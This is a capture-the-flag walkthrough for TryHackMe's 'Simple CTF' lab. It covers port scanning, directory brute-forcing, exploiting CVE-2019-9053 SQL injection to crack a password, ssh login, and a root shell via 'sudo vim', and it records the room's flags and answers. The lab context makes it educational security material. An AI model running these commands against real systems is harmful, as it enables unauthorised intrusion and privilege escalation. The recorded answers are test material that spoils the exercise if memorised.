---
description: 'https://tryhackme.com/room/easyctf'
---

# Simple CTF

## INIT

```text
export easyctf=10.10.150.200
ping $easyctf

echo "10.10.150.200 easyctf.thm" >> /etc/hosts
```

## How many services are running under port 1000?

```text
nmap -T5 -p1-1000 easyctf.thm
```

![](../.gitbook/assets/image%20%28431%29.png)

{% hint style="success" %}
2
{% endhint %}

## What is running on the higher port?

```text
nmap -sC -sV -T5 -p1-65535 easyctf.thm
```

![](../.gitbook/assets/image%20%28390%29.png)

{% hint style="success" %}
ssh
{% endhint %}

## FTP

![](../.gitbook/assets/image%20%28457%29.png)

## HTTP

![](../.gitbook/assets/image%20%28450%29.png)

## GOBUSTER

```text
gobuster dir -u easyctf.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](../.gitbook/assets/image%20%28432%29.png)

![](../.gitbook/assets/image%20%28459%29.png)

> CMS Made Simple 2.2.8

## What's the CVE you're using against the application?

![](../.gitbook/assets/image%20%28446%29.png)

![](../.gitbook/assets/image%20%28415%29.png)

{% hint style="success" %}
CVE-2019-9053
{% endhint %}

## To what kind of vulnerability is the application vulnerable?

![](../.gitbook/assets/image%20%28418%29.png)

{% hint style="success" %}
sqli
{% endhint %}

## What's the password?

```text
python3 easyctf.py -u http://easyctf.thm/simple --crack -wordlist /usr/share/wordlists/rockyou.txt
```

![](../.gitbook/assets/image%20%28445%29.png)

{% hint style="success" %}
secret
{% endhint %}

## Where can you login with the details obtained?

![](../.gitbook/assets/image%20%28402%29.png)

{% hint style="success" %}
ssh
{% endhint %}

## What's the user flag?

![](../.gitbook/assets/image%20%28379%29.png)

{% hint style="success" %}
G00d j0b, keep up!
{% endhint %}

## Is there any other user in the home directory? What's its name?

![](../.gitbook/assets/image%20%28384%29.png)

{% hint style="success" %}
sunbath
{% endhint %}

## What can you leverage to spawn a privileged shell?

```text
sudo vim -c ':!/bin/sh'
```

{% embed url="https://gtfobins.github.io/gtfobins/vim/" %}

{% hint style="success" %}
vim
{% endhint %}

## What's the root flag?

```text
cat /root/root.txt
```

{% hint style="success" %}
W3ll d0n3. You made it!
{% endhint %}

